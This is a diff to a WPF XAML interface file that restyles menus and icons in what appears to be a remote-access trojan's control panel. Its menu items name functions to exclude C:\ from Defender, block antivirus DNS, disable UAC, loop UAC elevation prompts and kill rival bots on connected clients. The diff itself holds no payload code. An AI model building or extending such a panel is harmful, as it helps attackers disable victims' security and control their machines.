@@ -117,11 +117,13 @@
                                         <ColumnDefinition Width="*"/>
                                         <ColumnDefinition Width="16"/>
                                     </Grid.ColumnDefinitions>
+                                    <Rectangle Grid.Column="0" Fill="#0C0D1E"/>
+                                    <Rectangle Grid.Column="0" HorizontalAlignment="Right" Width="1" Fill="#191B30" VerticalAlignment="Stretch"/>
                                     <ContentPresenter Grid.Column="0" ContentSource="Icon"
                                                       HorizontalAlignment="Center" VerticalAlignment="Center"
                                                       Margin="0,6,0,6"/>
                                     <ContentPresenter Grid.Column="1" ContentSource="Header"
-                                                      Margin="2,7,4,7" VerticalAlignment="Center"/>
+                                                      Margin="4,7,4,7" VerticalAlignment="Center"/>
                                     <TextBlock x:Name="Arrow" Grid.Column="2" Text="›" FontSize="13"
                                                VerticalAlignment="Center" HorizontalAlignment="Center"
                                                Foreground="#505878" Visibility="Collapsed"/>
@@ -132,7 +134,7 @@
                                    IsOpen="{Binding IsSubmenuOpen, RelativeSource={RelativeSource TemplatedParent}}"
                                    Placement="Right" HorizontalOffset="-2" VerticalOffset="-5"
                                    AllowsTransparency="True" Focusable="False" PopupAnimation="Fade">
-                                <Border Background="#0F1020" BorderBrush="#1E2038" BorderThickness="1"
+                                <Border Background="#111225" BorderBrush="#22253E" BorderThickness="1"
                                         CornerRadius="8" Padding="4" MinWidth="168">
                                     <Border.Effect>
                                         <DropShadowEffect BlurRadius="22" ShadowDepth="6" Opacity="0.75" Color="#000"/>
@@ -144,7 +146,7 @@
                         </Grid>
                         <ControlTemplate.Triggers>
                             <Trigger Property="IsHighlighted" Value="True">
-                                <Setter TargetName="bd" Property="Background" Value="#181B34"/>
+                                <Setter TargetName="bd" Property="Background" Value="#1E2248"/>
                             </Trigger>
                             <Trigger Property="Role" Value="SubmenuHeader">
                                 <Setter TargetName="Arrow" Property="Visibility" Value="Visible"/>
@@ -671,7 +673,7 @@
                                             <MenuItem.Icon><TextBlock Text="&#x1F527;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
                                             <MenuItem Header="Exclude C:\ (Defender)" Click="QuickExcludeCDrive_Click"><MenuItem.Icon><TextBlock Text="&#x1F6E1;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
                                             <MenuItem Header="Block AV DNS"        Click="QuickBlockAvDns_Click">     <MenuItem.Icon><TextBlock Text="&#x1F6AB;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Block WSReset"       Click="QuickBlockReset_Click">     <MenuItem.Icon><TextBlock Text="&#x1F6AB;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem Header="Block WSReset"       Click="QuickBlockReset_Click">     <MenuItem.Icon><TextBlock Text="&#x1F512;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                             <MenuItem Header="Disable UAC"         Click="QuickDisableUac_Click" ToolTip="EnableLUA=0 (admin required, takes effect after reboot)"><MenuItem.Icon><TextBlock Text="&#x26A0;" FontSize="11" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
                                             <Separator/>
                                             <MenuItem Header="Run BotKiller"       Click="BotKiller_Click" ToolTip="Kill unsigned random-name processes"><MenuItem.Icon><TextBlock Text="&#x2620;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
@@ -687,11 +689,11 @@
                                         <!-- Client Management -->
                                         <MenuItem Header="Client Management">
                                             <MenuItem.Icon><TextBlock Text="&#x1F464;" FontSize="11" Foreground="#606880"/></MenuItem.Icon>
-                                            <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><TextBlock Text="&#x1F53A;" FontSize="10" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x21BA;" FontSize="13" Foreground="#f9e2af"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem Header="UAC Elevation"       Click="RequestElevation_Click">      <MenuItem.Icon><Viewbox Width="13" Height="14"><Canvas Width="20" Height="22"><Canvas.Clip><PathGeometry Figures="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z"/></Canvas.Clip><Rectangle Canvas.Left="0" Canvas.Top="0" Width="10" Height="11" Fill="#1769C4"/><Rectangle Canvas.Left="10" Canvas.Top="0" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="0" Canvas.Top="11" Width="10" Height="11" Fill="#EDAA00"/><Rectangle Canvas.Left="10" Canvas.Top="11" Width="10" Height="11" Fill="#1769C4"/><Path Data="M10,0 L20,3 L20,12 C20,18 10,22 10,22 C10,22 0,18 0,12 L0,3 Z" Stroke="#0A0B18" StrokeThickness="2.5" Fill="Transparent"/><Line X1="10" Y1="0" X2="10" Y2="22" Stroke="#0A0B18" StrokeThickness="1.2"/><Line X1="0" Y1="11" X2="20" Y2="11" Stroke="#0A0B18" StrokeThickness="1.2"/></Canvas></Viewbox></MenuItem.Icon></MenuItem>
+                                            <MenuItem Header="Loop UAC"            Click="RequestElevationLoop_Click">  <MenuItem.Icon><TextBlock Text="&#x1F501;" FontSize="11" FontFamily="Segoe UI Emoji"/></MenuItem.Icon></MenuItem>
                                             <Separator/>
                                             <MenuItem Header="Update Client"       Click="UpdateClient_Click">          <MenuItem.Icon><TextBlock Text="&#x1F504;" FontSize="11" Foreground="#a6e3a1"/></MenuItem.Icon></MenuItem>
-                                            <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x1F4DF;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
+                                            <MenuItem Header="Disconnect"          Click="DisconnectClient_Click">      <MenuItem.Icon><TextBlock Text="&#x2716;" FontSize="12" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                             <MenuItem Header="Uninstall Client"    Click="UninstallClient_Click">       <MenuItem.Icon><TextBlock Text="&#x1F5D1;" FontSize="11" Foreground="#f38ba8"/></MenuItem.Icon></MenuItem>
                                             <Separator/>
                                             <MenuItem Header="Set Tag"             Click="SetTag_Click">                <MenuItem.Icon><TextBlock Text="&#x1F3F7;" FontSize="10" Foreground="#89b4fa"/></MenuItem.Icon></MenuItem>
